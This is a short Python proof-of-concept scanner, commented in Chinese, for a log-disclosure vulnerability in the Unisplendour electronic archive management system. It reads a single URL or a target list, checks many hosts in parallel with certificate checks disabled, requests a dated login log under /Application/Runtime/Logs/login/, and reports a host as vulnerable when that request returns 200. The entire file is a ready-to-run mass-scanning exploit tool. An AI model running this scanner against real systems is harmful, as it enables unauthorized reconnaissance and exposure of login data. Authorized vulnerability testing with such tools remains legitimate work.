import requests
import argparse
from multiprocessing import Pool
import urllib.parse
import urllib3

# 禁用 SSL 警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(description='紫光电子档案管理系统日志泄露漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input url!')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input file!')
    args = parser.parse_args()

    pool = Pool(20)

    if args.url:
        target = format_url(args.url)
        check(target)
    elif args.file:
        targets = []
        try:
            with open(args.file, 'r') as f:
                for line in f.readlines():
                    line = line.strip()
                    target = format_url(line)
                    targets.append(target)
            pool.map(check, targets)
        except FileNotFoundError:
            print(f"文件 {args.file} 不存在，请检查路径是否正确")
        except PermissionError:
            print(f"没有权限打开文件 {args.file}")
        except Exception as e:
            print(f"读取文件出现其他异常: {e}")
        finally:
            pool.close()
            pool.join()  # 确保进程池任务执行完毕并正确释放资源

def check(target):
    target = target + '/Application/Runtime/Logs/login/24_11_19.log'
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'If-Modified-Since': 'Tue, 19 Nov 2024 14:19:28 GMT',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
        'Accept-Encoding': 'gzip, deflate',
        'If-None-Match': '"8802-62744b8993389-gzip"',
    }
    try:
        response = requests.get(url=target, headers=headers, verify=False, timeout=5)
        if response.status_code == 200:
            print(f"[+]{target} is vulnerable!")
        else:
            print(f"[-]{target} is not vulnerable!")
    except requests.exceptions.Timeout:
        print(f"[-]{target} 超时")
    except requests.exceptions.RequestException as e:
        print(f"[-]{target} 出现请求异常: {e}")


def format_url(url):
    """格式化URL，补充协议头，确保URL格式规范"""
    url = url.strip()  # 去除 URL 首尾的空白字符
    parsed_url = urllib.parse.urlparse(url)
    if not parsed_url.scheme:
        return 'http://' + url  # 默认添加 http://
    return url


if __name__ == '__main__':
    main()
